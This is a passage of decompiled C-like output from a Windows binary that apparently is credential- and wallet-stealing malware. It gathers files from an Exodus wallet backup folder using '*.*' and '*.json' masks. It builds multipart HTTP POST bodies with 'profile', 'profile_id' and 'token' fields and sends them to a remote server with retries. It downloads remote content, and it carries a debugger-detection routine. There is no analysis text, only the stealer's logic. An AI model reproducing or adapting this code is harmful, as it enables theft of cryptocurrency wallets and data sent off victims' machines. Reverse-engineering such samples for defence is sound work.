  piVar2 = (int *)_strlen((char *)DAT_003d8b70);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8c50;
  local_8 = CONCAT31(local_8._1_3_,0x1f);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8c50);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,1,pvVar5);
  ppiVar1 = DAT_003d8c94;
  piVar2 = (int *)_strlen((char *)DAT_003d8c94);
  local_58c = (undefined *)0x397dab;
  FUN_003894c0(&stack0xfffffa80,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8fa0;
  local_8 = 0x20;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8fa0);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8f40;
  local_8 = CONCAT31(local_8._1_3_,0x21);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8f40);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  piVar2 = (int *)_strlen("*.*");
  local_58c = (undefined *)0x397e7d;
  FUN_003894c0(&stack0xfffffa80,(int **)&DAT_003d0e6c,piVar2);
  ppiVar1 = DAT_003d8e88;
  local_8 = 0x22;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8e88);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8b90;
  local_8 = CONCAT31(local_8._1_3_,0x23);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8b90);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,1,pvVar5);
  piVar2 = (int *)_strlen("*.json");
  local_58c = (undefined *)0x397f50;
  FUN_003894c0(&stack0xfffffa80,(int **)"*.json",piVar2);
  ppiVar1 = DAT_003d90ec;
  local_8 = 0x24;
  local_58c = (undefined *)0x0;
  local_59c = (undefined *)((uint)local_59c & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d90ec);
  FUN_003894c0(&local_59c,ppiVar1,piVar2);
  ppiVar1 = DAT_003d8f20;
  local_8 = CONCAT31(local_8._1_3_,0x25);
  pvVar5 = (void *)((uint)pvVar5 & 0xffffff00);
  piVar2 = (int *)_strlen((char *)DAT_003d8f20);
  FUN_003894c0(&stack0xfffffa48,ppiVar1,piVar2);
  local_8 = 0xffffffff;
  FUN_003960f0(param_1,0,pvVar5);
  FUN_00396990(DAT_003d8b7c,DAT_003d8cc0);
  FUN_00396990(DAT_003d8ac8,DAT_003d9284);
  FUN_00396990(DAT_003d8ac8,DAT_003d8b5c);
  FUN_00396990(DAT_003d8ac8,DAT_003d9240);
  FUN_00396ce0("\\Exodus\\backups","Exodus\\backups",&DAT_003d0e6c,*(int **)(param_1 + 0x20));
  trim_string((undefined (*) [16])local_434,0,0x104);
  trim_string((undefined (*) [16])local_53c,0,0x104);
  trim_string((undefined (*) [16])local_11c,0,0x104);
  trim_string((undefined (*) [16])local_32c,0,0x104);
  trim_string((undefined (*) [16])local_224,0,0x104);
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  local_58c = local_11c;
  uStack1424 = 0x39815c;
  (*_DAT_003d9520)();
  uStack1424 = DAT_003d8d64;
  puStack1428 = local_11c;
  puStack1432 = (undefined *)0x39816f;
  (*_DAT_003d9520)();
  puStack1432 = &DAT_003ce7fc;
  local_59c = local_11c;
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)();
  (*_DAT_003d9520)(local_53c);
  (*_DAT_003d9520)(local_224,DAT_003d8c64);
  (*_DAT_003d9520)(local_224,&DAT_003ce7fc);
  (*_DAT_003d9520)(local_224,DAT_003d8f3c);
  puVar4 = local_32c;
  (*_DAT_003d9520)(puVar4,&DAT_003ce7fc);
  uVar3 = SUB41(puVar4,0);
  (*_DAT_003d9520)(local_32c,local_224);
  (*_DAT_003d9520)(local_32c,&DAT_003ce7fc);
  FUN_00396990(&DAT_003d0e6c,local_434);
  FUN_00396990(&DAT_003d0e6c,local_53c);
  FUN_00396990(&DAT_003d0e6c,local_32c);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,param_1,uVar3);
  return;
}



void FUN_00398300(int **param_1,int *param_2)

{
  uint uVar1;
  bool bVar2;
  int *in_EAX;
  int **ppiVar3;
  int **extraout_ECX;
  int *piVar4;
  int **unaff_EDI;
  
  piVar4 = param_1[4];
  ppiVar3 = param_1;
  if (piVar4 < param_2) {
    in_EAX = (int *)FUN_003ae39d("invalid string position");
    ppiVar3 = extraout_ECX;
  }
  piVar4 = (int *)((int)piVar4 - (int)param_2);
  if (in_EAX < piVar4) {
    piVar4 = in_EAX;
  }
  if (unaff_EDI != ppiVar3) {
    bVar2 = FUN_00398430();
    if (bVar2 != false) {
      if ((int *)0x7 < param_1[5]) {
        param_1 = (int **)*param_1;
      }
      ppiVar3 = unaff_EDI;
      if (&DAT_00000008 <= unaff_EDI[5]) {
        ppiVar3 = (int **)*unaff_EDI;
      }
      uVar1 = (int)piVar4 * 2;
      FUN_003aee70(ppiVar3,(undefined4 *)((int)param_1 + (int)param_2 * 2),uVar1);
      unaff_EDI[4] = piVar4;
      if ((int *)0x7 < unaff_EDI[5]) {
        *(undefined2 *)(uVar1 + (int)*unaff_EDI) = 0;
        return;
      }
      *(undefined2 *)(uVar1 + (int)unaff_EDI) = 0;
    }
    return;
  }
  FUN_003983b0((int *)((int)piVar4 + (int)param_2));
  FUN_003983b0((int *)0x0);
  return;
}



void __fastcall FUN_003983b0(int *param_1)

{
  int **ppiVar1;
  uint in_EAX;
  int *piVar2;
  uint uVar3;
  int *extraout_ECX;
  int **ppiVar4;
  int **unaff_ESI;
  
  piVar2 = unaff_ESI[4];
  if (piVar2 < param_1) {
    piVar2 = (int *)FUN_003ae39d("invalid string position");
    param_1 = extraout_ECX;
  }
  uVar3 = (int)piVar2 - (int)param_1;
  if (uVar3 < in_EAX) {
    in_EAX = uVar3;
  }
  if (in_EAX != 0) {
    ppiVar4 = unaff_ESI;
    ppiVar1 = unaff_ESI;
    if (&DAT_00000008 <= unaff_ESI[5]) {
      ppiVar4 = (int **)*unaff_ESI;
      ppiVar1 = (int **)*unaff_ESI;
    }
    FID_conflict__memcpy
              ((void *)((int)ppiVar4 + (int)param_1 * 2),
               (void *)((int)ppiVar1 + ((int)param_1 + in_EAX) * 2),(uVar3 - in_EAX) * 2);
    piVar2 = (int *)((int)unaff_ESI[4] - in_EAX);
    unaff_ESI[4] = piVar2;
    if ((int *)0x7 < unaff_ESI[5]) {
      *(undefined2 *)((int)*unaff_ESI + (int)piVar2 * 2) = 0;
      return;
    }
    *(undefined2 *)((int)unaff_ESI + (int)piVar2 * 2) = 0;
  }
  return;
}



bool FUN_00398430(void)

{
  void **in_EAX;
  void *unaff_ESI;
  
  if ((void *)0x7ffffffe < unaff_ESI) {
    in_EAX = (void **)FUN_003ae350("string too long");
  }
  if (in_EAX[5] < unaff_ESI) {
    FUN_003984c0(in_EAX,unaff_ESI,in_EAX[4]);
    return unaff_ESI != (void *)0x0;
  }
  if (unaff_ESI == (void *)0x0) {
    in_EAX[4] = (void *)0x0;
    if ((void *)0x7 < in_EAX[5]) {
      in_EAX = (void **)*in_EAX;
    }
    *(undefined2 *)in_EAX = 0;
  }
  return unaff_ESI != (void *)0x0;
}



void FUN_00398480(void)

{
  void **in_EAX;
  void **unaff_EDI;
  
  if (in_EAX != unaff_EDI) {
    do {
      if ((void *)0x7 < in_EAX[5]) {
        FUN_003aee4b(*in_EAX);
      }
      in_EAX[5] = (void *)0x7;
      in_EAX[4] = (void *)0x0;
      *(undefined2 *)in_EAX = 0;
      in_EAX = in_EAX + 7;
    } while (in_EAX != unaff_EDI);
  }
  return;
}



void FUN_003984c0(void **param_1,void *param_2,void *param_3)

{
  void *pvVar1;
  uint *puVar2;
  void **ppvVar3;
  void **ppvVar4;
  uint uVar5;
  void *pvVar6;
  int **in_FS_OFFSET;
  uint uStack52;
  undefined **local_24 [3];
  char *local_18;
  uint *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2f90;
  local_10 = *in_FS_OFFSET;
  uStack52 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_14 = &uStack52;
  *in_FS_OFFSET = (int *)&local_10;
  pvVar6 = (void *)((uint)param_2 | 7);
  if (pvVar6 < (void *)0x7fffffff) {
    pvVar1 = param_1[5];
    uVar5 = (uint)pvVar1 >> 1;
    param_2 = pvVar6;
    if (((uint)pvVar6 / 3 < uVar5) &&
       (param_2 = (void *)(uVar5 + (int)pvVar1), (void *)(0x7ffffffe - uVar5) < pvVar1)) {
      param_2 = (void *)0x7ffffffe;
    }
  }
  ppvVar3 = (void **)0x0;
  uVar5 = (int)param_2 + 1;
  local_8 = 0;
  puVar2 = &uStack52;
  if ((uVar5 != 0) &&
     ((puVar2 = &uStack52, 0x7fffffff < uVar5 ||
      (ppvVar3 = (void **)FUN_003b103e(uVar5 * 2), puVar2 = local_14, ppvVar3 == (void **)0x0)))) {
    local_14 = puVar2;
    local_18 = (char *)0x0;
    std::exception::exception((exception *)local_24,&local_18);
    local_24[0] = std::bad_alloc::vftable;
                    // WARNING: Subroutine does not return
    __CxxThrowException_8(local_24,&DAT_003d3140);
  }
  local_14 = puVar2;
  if (param_3 != (void *)0x0) {
    ppvVar4 = param_1;
    if (&DAT_00000008 <= param_1[5]) {
      ppvVar4 = (void **)*param_1;
    }
    FUN_003aee70(ppvVar3,ppvVar4,(int)param_3 * 2);
  }
  if ((void *)0x7 < param_1[5]) {
    FUN_003aee4b(*param_1);
  }
  *param_1 = ppvVar3;
  param_1[5] = param_2;
  param_1[4] = param_3;
  if ((void *)0x7 < param_2) {
    param_1 = ppvVar3;
  }
  *(undefined2 *)((int)param_1 + (int)param_3 * 2) = 0;
  *in_FS_OFFSET = local_10;
  return;
}



undefined * Catch_All_00398578(void)

{
  int iVar1;
  int unaff_EBP;
  
  iVar1 = *(int *)(unaff_EBP + 0xc);
  *(BADSPACEBASE **)(unaff_EBP + -0x10) = register0x00000010;
  *(int *)(unaff_EBP + 0xc) = iVar1;
  *(undefined *)(unaff_EBP + -4) = 2;
  iVar1 = FUN_00398630(iVar1 + 1);
  *(int *)(unaff_EBP + -0x14) = iVar1;
  return &DAT_00398596;
}



void Catch_All_003985ff(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = *(void ***)(unaff_EBP + 8);
  if ((void *)0x7 < ppvVar1[5]) {
    FUN_003aee4b(*ppvVar1);
  }
  ppvVar1[5] = (void *)0x7;
  ppvVar1[4] = (void *)0x0;
  *(undefined2 *)ppvVar1 = 0;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



int __fastcall FUN_00398630(uint param_1)

{
  int iVar1;
  undefined **local_14 [3];
  char *local_8;
  
  if (param_1 == 0) {
    return 0;
  }
  if ((param_1 < 0x80000000) && (iVar1 = FUN_003b103e(param_1 * 2), iVar1 != 0)) {
    return iVar1;
  }
  local_8 = (char *)0x0;
  std::exception::exception((exception *)local_14,&local_8);
  local_14[0] = std::bad_alloc::vftable;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(local_14,&DAT_003d3140);
}



void FUN_00398680(void)

{
  undefined4 *in_EAX;
  undefined *unaff_EBX;
  
  FUN_00389c20(in_EAX,0);
  *(undefined4 *)(unaff_EBX + 0x10) = 0;
  *(undefined4 *)(unaff_EBX + 0x14) = 0xf;
  *unaff_EBX = 0;
  FUN_003893d0();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003986c0(void)

{
  undefined unaff_SI;
  undefined8 uVar1;
  undefined4 local_84;
  undefined *local_80;
  undefined4 local_7c;
  undefined local_48 [64];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  trim_string((undefined (*) [16])local_48,0,0x40);
  trim_string((undefined (*) [16])&local_84,0,0x3c);
  local_80 = local_48;
  local_84 = 0x3c;
  local_7c = 0x40;
  (*_DAT_003d9418)();
  uVar1 = (*_DAT_003d93fc)();
  terminate_if_debugger_present
            (local_8 ^ (uint)&stack0xfffffffc,(int)((ulonglong)uVar1 >> 0x20),unaff_SI);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_00398740(void *this,undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 extraout_EDX;
  undefined8 uVar5;
  char *pcVar6;
  undefined uVar7;
  undefined4 uVar8;
  uint local_520;
  undefined4 local_51c;
  undefined4 local_518;
  int local_514;
  int local_510;
  uint local_50c;
  undefined local_508 [1024];
  undefined local_108 [256];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar8 = 0;
  local_51c = param_1;
  local_514 = 0;
  local_518 = 0x100;
  uVar5 = (*_DAT_003d945c)(&DAT_003ce656,1,0,0,0);
  uVar2 = (undefined4)((ulonglong)uVar5 >> 0x20);
  iVar1 = (int)uVar5;
  uVar7 = (undefined)uVar8;
  if (iVar1 != 0) {
    pcVar6 = "https";
    uVar2 = FUN_003986c0();
    iVar3 = (*_DAT_003d9550)(uVar2,pcVar6);
    if (iVar3 == 0) {
      local_514 = 1;
    }
    local_510 = 0;
    do {
      if (local_514 == 0) {
        uVar2 = 0x100;
      }
      else {
        uVar2 = 0x800100;
      }
      uVar2 = (*_DAT_003d9460)(iVar1,this,0,0,uVar2,0);
      iVar3 = (*_DAT_003d95d4)(uVar2,0x13,local_108,&local_518,0);
      if (iVar3 != 0) {
        iVar3 = (*_DAT_003d9550)(local_108,&DAT_003d0eb8);
        if (iVar3 == 0) break;
        (*_DAT_003d9390)(1000);
      }
      local_510 = local_510 + 1;
    } while (local_510 < 3);
    uVar4 = (*_DAT_003d93b4)(local_51c,0x40000000,3,0,2,0x80,0);
    iVar3 = (*_DAT_003d9480)(uVar2,local_508,0x400,&local_50c);
    while (uVar7 = (undefined)uVar8, iVar3 != 0) {
      if (local_50c != 0) {
        iVar3 = (*_DAT_003d9420)(uVar4,local_508,local_50c,&local_520,0);
        uVar7 = (undefined)uVar8;
        if ((iVar3 == 0) || (local_50c != local_520)) break;
      }
      uVar7 = (undefined)uVar8;
      if (local_50c < 0x400) break;
      iVar3 = (*_DAT_003d9480)(uVar2,local_508,0x400,&local_50c);
    }
    trim_string((undefined (*) [16])local_508,0,0x400);
    (*_DAT_003d93b8)(uVar4);
    (*_DAT_003d9458)(uVar2);
    (*_DAT_003d9458)(iVar1);
    uVar2 = extraout_EDX;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar2,uVar7);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00398900(undefined4 *param_1,uint param_2,undefined4 *param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 **ppuVar4;
  int iVar5;
  undefined *puVar6;
  uint uVar7;
  int iVar8;
  int iVar9;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  int **in_FS_OFFSET;
  uint in_stack_00000018;
  int in_stack_00000024;
  undefined4 in_stack_00000028;
  int in_stack_0000002c;
  int in_stack_00000030;
  undefined4 in_stack_00000034;
  undefined4 in_stack_00000038;
  int in_stack_0000003c;
  undefined4 *puVar10;
  undefined uVar11;
  char *pcVar12;
  undefined4 local_227c;
  undefined4 local_2278;
  undefined4 local_2274;
  uint local_2270;
  int local_226c;
  int local_2268;
  int local_2264;
  int local_2260;
  int local_225c;
  undefined4 *local_2258;
  undefined local_2254 [5000];
  undefined local_ecc [2000];
  undefined local_6fc [256];
  undefined local_5fc [500];
  undefined local_408 [500];
  undefined4 local_214 [128];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2dc8;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_225c = in_stack_00000024;
  local_2264 = in_stack_00000030;
  local_2274 = in_stack_00000038;
  local_226c = in_stack_0000003c;
  local_8 = 0;
  local_2270 = param_2;
  local_2258 = param_1;
  local_14 = uVar2;
  trim_string((undefined (*) [16])local_2254,0,5000);
  trim_string((undefined (*) [16])local_5fc,0,500);
  trim_string((undefined (*) [16])local_214,0,0x200);
  uVar3 = (*_DAT_003d957c)(0,0x800000,uVar2);
  uVar2 = (*_DAT_003d9504)(uVar3);
  trim_string((undefined (*) [16])local_408,0,500);
  ppuVar4 = (undefined4 **)param_3;
  if (in_stack_00000018 < 0x10) {
    ppuVar4 = &param_3;
  }
  local_2268 = (*_DAT_003d945c)(ppuVar4,1,0,0,0);
  local_227c = 120000;
  (*_DAT_003d9350)(local_2268,2,&local_227c,4);
  pcVar12 = "https://";
  local_2278 = 0x100;
  local_2260 = 0;
  iVar5 = (*_DAT_003d9550)();
  uVar11 = SUB41(pcVar12,0);
  if (iVar5 == 0) {
    local_2260 = 1;
  }
  if (local_2268 != 0) {
    puVar6 = FUN_003a5610();
    (*_DAT_003d9520)(local_5fc,puVar6);
    (*_DAT_003d9520)(uVar2,&DAT_003d0ebc);
    (*_DAT_003d9520)(uVar2,"------");
    (*_DAT_003d9520)(uVar2,local_5fc);
    (*_DAT_003d9520)(uVar2,&DAT_003d0ec8);
    (*_DAT_003d9520)(uVar2,&DAT_003d0ebc);
    (*_DAT_003d9520)(local_408,&DAT_003d0ecc);
    (*_DAT_003d9520)(local_408,"ent-Typ");
    (*_DAT_003d9520)(local_408,"e: multip");
    (*_DAT_003d9520)(local_408,"art/for");
    (*_DAT_003d9520)(local_408,"m-data; ");
    (*_DAT_003d9520)(local_408,&DAT_003d0efc);
    (*_DAT_003d9520)(local_408,"dary=");
    (*_DAT_003d9520)(local_408,&DAT_003d0f0c);
    (*_DAT_003d9520)(local_408,local_5fc);
    iVar5 = local_2260;
    local_2260 = (*_DAT_003d9578)(local_2268,local_225c,in_stack_00000028,0,0,3,0,0);
    uVar11 = SUB41(pcVar12,0);
    if (local_2260 != 0) {
      if (iVar5 == 0) {
        uVar3 = 0x400100;
      }
      else {
        uVar3 = 0xc00100;
      }
      local_225c = (*_DAT_003d95bc)(local_2260,&DAT_003d0f20,local_2258,"HTTP/1.1",0,0,uVar3,0);
      uVar11 = SUB41(pcVar12,0);
      if (local_225c != 0) {
        (*_DAT_003d9520)(local_214,"------");
        (*_DAT_003d9520)(local_214,local_5fc);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"Content-Disposition: form-data; name=\"");
        (*_DAT_003d9520)(local_214,"profile");
        (*_DAT_003d9520)(local_214,"\"\r\n\r\n");
        (*_DAT_003d9520)(local_214,local_2264);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"------");
        (*_DAT_003d9520)(local_214,local_5fc);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"Content-Disposition: form-data; name=\"");
        (*_DAT_003d9520)(local_214,"profile_id");
        (*_DAT_003d9520)(local_214,"\"\r\n\r\n");
        (*_DAT_003d9520)(local_214,in_stack_00000034);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"------");
        (*_DAT_003d9520)(local_214,local_5fc);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"Content-Disposition: form-data; name=\"");
        (*_DAT_003d9520)(local_214,&DAT_003d0f6c);
        (*_DAT_003d9520)(local_214,"\"\r\n\r\n");
        (*_DAT_003d9520)(local_214,local_2274);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"------");
        (*_DAT_003d9520)(local_214,local_5fc);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"Content-Disposition: form-data; name=\"");
        (*_DAT_003d9520)(local_214,"token");
        (*_DAT_003d9520)(local_214,"\"\r\n\r\n");
        (*_DAT_003d9520)(local_214,local_226c);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"------");
        (*_DAT_003d9520)(local_214,local_5fc);
        (*_DAT_003d9520)(local_214,&DAT_003d0ebc);
        (*_DAT_003d9520)(local_214,"Content-Disposition: form-data; name=\"");
        (*_DAT_003d9520)(local_214,&DAT_003d0f7c);
        (*_DAT_003d9520)(local_214,"\"\r\n\r\n");
        local_226c = (*_DAT_003d9418)(uVar2);
        iVar5 = (*_DAT_003d9418)(local_214);
        iVar5 = iVar5 + local_226c + in_stack_0000002c;
        uVar3 = (*_DAT_003d957c)(0,iVar5);
        local_2258 = (undefined4 *)(*_DAT_003d9504)(uVar3);
        uVar7 = (*_DAT_003d9418)(local_214);
        FUN_003aee70(local_2258,local_214,uVar7);
        puVar10 = local_214;
        uVar7 = local_2270;
        iVar8 = (*_DAT_003d9418)();
        FUN_003aee70((undefined4 *)(iVar8 + (int)local_2258),puVar10,uVar7);
        uVar3 = (*_DAT_003d9418)(uVar2);
        puVar10 = local_214;
        iVar8 = (*_DAT_003d9418)(puVar10,uVar2,uVar3);
        FUN_003aee70((undefined4 *)(iVar8 + in_stack_0000002c + (int)local_2258),puVar10,uVar2);
        iVar8 = 0;
        do {
          uVar3 = (*_DAT_003d9418)(local_408,local_2258,iVar5);
          iVar1 = local_225c;
          (*_DAT_003d953c)(local_225c,local_408,uVar3);
          iVar9 = (*_DAT_003d95d4)(iVar1,0x13,local_6fc,&local_2278,0);
          if ((iVar9 != 0) && (iVar9 = (*_DAT_003d9550)(local_6fc,&DAT_003d0eb8), iVar9 == 0))
          break;
          (*_DAT_003d9390)(30000);
          iVar8 = iVar8 + 1;
        } while (iVar8 < 6);
        trim_string((undefined (*) [16])&local_2258,0,4);
        iVar5 = (*_DAT_003d9480)(iVar1,local_ecc,1999,&local_2264);
        while ((uVar11 = SUB41(pcVar12,0), iVar5 != 0 && (local_2264 != 0))) {
          local_ecc[local_2264] = 0;
          (*_DAT_003d9520)(local_2254,local_ecc);
          iVar5 = (*_DAT_003d9480)(local_225c,local_ecc,1999,&local_2264);
        }
      }
    }
  }
  (*_DAT_003d9458)(local_225c);
  (*_DAT_003d9458)(local_2260);
  (*_DAT_003d9458)(local_2268);
  uVar3 = extraout_EDX;
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_3);
    uVar3 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar3,uVar11);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_00399090(void *this,undefined4 *param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  undefined *puVar4;
  undefined4 **ppuVar5;
  int iVar6;
  int **in_FS_OFFSET;
  uint in_stack_00000018;
  undefined uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 local_4a4;
  undefined *local_4a0;
  undefined4 local_49c;
  undefined4 local_468;
  undefined4 local_464;
  uint local_460;
  int local_45c;
  undefined4 local_458 [256];
  undefined local_58 [64];
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2d98;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  local_460 = 1;
  local_45c = 0;
  local_18 = uVar1;
  trim_string((undefined (*) [16])local_58,0,0x40);
  trim_string((undefined (*) [16])&local_4a4,0,0x3c);
  local_4a0 = local_58;
  local_4a4 = 0x3c;
  local_49c = 0x40;
  uVar2 = (*_DAT_003d9418)(this,0x10000000,&local_4a4,uVar1);
  iVar3 = (*_DAT_003d93fc)(this,uVar2);
  puVar4 = local_4a0;
  if (iVar3 == 0) {
    puVar4 = &DAT_003d0eb0;
  }
  iVar3 = (*_DAT_003d9550)(puVar4,"https");
  if (iVar3 == 0) {
    local_45c = 1;
  }
  uVar2 = (*_DAT_003d957c)(0,99999999);
  iVar3 = (*_DAT_003d9504)(uVar2);
  ppuVar5 = (undefined4 **)param_1;
  if (in_stack_00000018 < 0x10) {
    ppuVar5 = &param_1;
  }
  uVar2 = (*_DAT_003d945c)(ppuVar5,0,0,0,0);
  local_468 = 600000;
  local_464 = uVar2;
  (*_DAT_003d9350)(uVar2,2,&local_468,4);
  if (local_45c == 0) {
    uVar9 = 0x4000100;
  }
  else {
    uVar9 = 0x4800100;
  }
  uVar8 = 0;
  local_45c = (*_DAT_003d9460)(uVar2,this,0,0,uVar9,0);
  iVar6 = 0;
  while (uVar7 = (undefined)uVar8, local_460 != 0) {
    (*_DAT_003d9480)(local_45c,local_458,0x400,&local_460);
    uVar7 = (undefined)uVar8;
    uVar1 = 0;
    if (local_460 == 0) break;
    do {
      FUN_003aee70((undefined4 *)(iVar6 + iVar3),(undefined4 *)((int)local_458 + uVar1),1);
      uVar1 = uVar1 + 1;
      iVar6 = iVar6 + 1;
    } while (uVar1 < local_460);
  }
  (*_DAT_003d9458)(local_45c);
  (*_DAT_003d9458)(local_464);
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_1);
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,iVar6,uVar7);
  return;
}



_Lockit * FUN_00399290(_Lockit *param_1)

{
  char *unaff_EDI;
  int **in_FS_OFFSET;
  undefined **local_20 [3];
  char *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2c24;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  std::_Lockit::_Lockit(param_1,0);
  *(undefined4 *)(param_1 + 4) = 0;
  param_1[8] = (_Lockit)0x0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  param_1[0x10] = (_Lockit)0x0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  param_1[0x18] = (_Lockit)0x0;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  param_1[0x20] = (_Lockit)0x0;
  local_8 = 4;
  if (unaff_EDI == (char *)0x0) {
    local_14 = "bad locale name";
    std::exception::exception((exception *)local_20,&local_14);
    local_20[0] = std::runtime_error::vftable;
                    // WARNING: Subroutine does not return
    __CxxThrowException_8(local_20,&DAT_003d3178);
  }
  std::_Locinfo::_Locinfo_ctor((_Locinfo *)param_1,unaff_EDI);
  *in_FS_OFFSET = local_10;
  return param_1;
}



void FUN_00399330(int *param_1)

{
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2b84;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 4;
  std::_Locinfo::_Locinfo_dtor((_Locinfo *)param_1);
  if ((void *)param_1[7] != (void *)0x0) {
    _free((void *)param_1[7]);
  }
  param_1[7] = 0;
  if ((void *)param_1[5] != (void *)0x0) {
    _free((void *)param_1[5]);
  }
  param_1[5] = 0;
  if ((void *)param_1[3] != (void *)0x0) {
    _free((void *)param_1[3]);
  }
  param_1[3] = 0;
  if ((void *)param_1[1] != (void *)0x0) {
    _free((void *)param_1[1]);
  }
  param_1[1] = 0;
  local_8 = 0xffffffff;
  FUN_003ae995(param_1);
  *in_FS_OFFSET = local_10;
  return;
}



undefined ** __thiscall FUN_003993e0(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::runtime_error::vftable;
  return (undefined **)this;
}



void __fastcall FUN_00399400(int param_1)

{
  int local_8;
  
  local_8 = param_1;
  std::_Lockit::_Lockit((_Lockit *)&local_8,0);
  if (*(int *)(param_1 + 4) != -1) {
    *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + 1;
  }
  FUN_003ae995(&local_8);
  return;
}



uint __fastcall FUN_00399430(uint param_1)

{
  int iVar1;
  uint local_8;
  
  local_8 = param_1;
  std::_Lockit::_Lockit((_Lockit *)&local_8,0);
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 != 0) && (iVar1 != -1)) {
    *(int *)(param_1 + 4) = iVar1 + -1;
  }
  iVar1 = *(int *)(param_1 + 4);
  FUN_003ae995((int *)&local_8);
  return ~-(uint)(iVar1 != 0) & param_1;
}



void __fastcall FUN_00399480(uint *param_1)

{
  uint uVar1;
  int iVar2;
  code **ppcVar3;
  uint *local_8;
  
  uVar1 = *param_1;
  if (uVar1 != 0) {
    local_8 = param_1;
    std::_Lockit::_Lockit((_Lockit *)&local_8,0);
    iVar2 = *(int *)(uVar1 + 4);
    if ((iVar2 != 0) && (iVar2 != -1)) {
      *(int *)(uVar1 + 4) = iVar2 + -1;
    }
    iVar2 = *(int *)(uVar1 + 4);
    FUN_003ae995((int *)&local_8);
